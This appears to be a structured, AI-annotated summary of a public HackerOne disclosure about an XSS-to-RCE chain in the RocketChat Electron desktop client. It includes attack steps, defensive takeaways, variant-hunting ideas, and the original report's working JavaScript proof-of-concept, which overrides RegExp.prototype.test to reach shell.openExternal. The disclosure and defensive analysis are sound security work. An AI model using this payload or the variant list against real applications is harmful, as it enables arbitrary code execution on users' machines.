# XSS leads to RCE on the RocketChat desktop client via electron.shell.openExternal

## Metadata
- **Source:** HackerOne
- **Report:** 899964 | https://hackerone.com/reports/899964
- **Submitted:** 2020-06-16
- **Reporter:** fabianfreyer
- **Program:** RocketChat
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Cross-Site Scripting (XSS), Remote Code Execution (RCE), Privilege Escalation, Insecure Electron API Usage
- **CVEs:** None
- **Category:** web-api

## Summary
The RocketChat desktop client (Electron-based) exposes the electron.shell.openExternal API to untrusted webview content, allowing attackers to execute arbitrary system commands. By combining this with existing XSS vulnerabilities and manipulating RegExp.prototype.test, attackers can bypass security checks and execute arbitrary applications or URLs.

## Attack scenario
1. Attacker identifies an XSS vulnerability in RocketChat server (e.g., #894462 or #899954)
2. Attacker crafts malicious JavaScript payload that modifies RegExp.prototype.test to intercept URL validation
3. Attacker creates a link element with a crafted file:// or command URL (e.g., file:///System/Applications/Calculator.app)
4. Modified RegExp.prototype.test returns true after a threshold, bypassing existing URL validation checks
5. Attacker triggers click event on the link, invoking electron.shell.openExternal
6. Arbitrary application launches or command executes with the privileges of the RocketChat desktop client

## Root cause
The Electron preload script or IPC bridge improperly exposes electron.shell.openExternal to webview content without adequate sandboxing. URL validation using RegExp can be bypassed by overriding RegExp.prototype.test, and the click handler in the onclick path directly invokes the API without additional security checks.

## Attacker mindset
An attacker leverages prototype pollution/prototype manipulation to bypass client-side validation mechanisms. By understanding how Electron's API bridge works and identifying the gap between XSS scope and Electron API access, the attacker chains together multiple weaknesses: XSS → RegExp bypass → Electron API access → RCE.

## Defensive takeaways
- Never expose electron.shell or other privileged Electron APIs directly to webview content; use strict IPC with validation
- Implement strong Content Security Policy (CSP) to restrict script execution and object manipulation
- Validate and sanitize all user input before rendering in webviews; use libraries like DOMPurify
- Do not rely on JavaScript-based validation (RegExp) for security-critical decisions; validate on trusted process boundary
- Use Electron's contextIsolation and preload scripts with minimal API surface exposed to renderers
- Implement URL scheme whitelisting and canonicalization before passing to shell.openExternal
- Monitor for prototype pollution attacks by freezing critical prototype methods (Object.freeze(RegExp.prototype))
- Regularly audit and minimize the attack surface of Electron IPC bridges

## Variant hunting
Search for other Electron APIs exposed to webviews: shell.openPath, app.getPath, clipboard operations
Test if other prototype methods (String.prototype.match, Array.prototype.filter) can bypass validation
Investigate if preload scripts properly isolate globals or if __proto__ manipulation affects validation
Check for similar XSS → RCE chains in other Electron-based applications (Discord, Slack desktop, VS Code)
Examine if IPC message handlers validate sender origin and restrict sensitive operations
Look for DOM-based XSS in error pages, settings pages, or plugin frameworks within RocketChat

## MITRE ATT&CK
- T1190
- T1203
- T1566
- T1059
- T1195
- T1547

## Notes
This vulnerability requires chaining XSS with Electron API exposure, making it a sophisticated attack requiring initial XSS access. The use of RegExp.prototype.test manipulation is a clever bypass technique that exploits JavaScript's dynamic nature. Affected versions: up to 2.17.9. The vulnerability demonstrates the danger of exposing system APIs to untrusted content in hybrid applications.

## Full report
<details><summary>Expand</summary>

**Summary:** It is possible to call `electron.shell.openExternal` from javascript inside a server webview.

**Description:** The document `onclick` handler allows executing `electron.shell.openExternal` by crafting an attacker-controlled link and dispatching a `click` event on it after overwriting `Regex.test`.

## Releases Affected:

  * Rocket.Chat Desktop Client up to version 2.17.9

## Steps To Reproduce (from initial installation to vulnerability):

  1. Have a XSS vulnerability such as #894462 or #899954.
  2. Call the following payload (for macos, adjust for other OSes as required):

```js
(function() {
    const payload = `file:///System/Applications/Calculator.app`;
    var counter = 0;
    var target = document.createElement(`a`);
    target.setAttribute(`href`, payload);
    document.body.appendChild(target);
    var old_test = RegExp.prototype.test;
    RegExp.prototype.test = function (s) {
        if (s === payload) {
            return (++counter > 3);
        }
        return old_test.call(this, s);
    };
    target.dispatchEvent(new Event(`click`));
})();
```

  3. Browse to a page with the XSS payload.
  4. Use your freshly opened calculator to calculate the result of 7*191.

## Impact

An attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call `electron.shell.openExternal` with arbitrary URLs, leading to arbitrary command execution.

</details>

---
*Analysed by Claude on 2026-05-12*
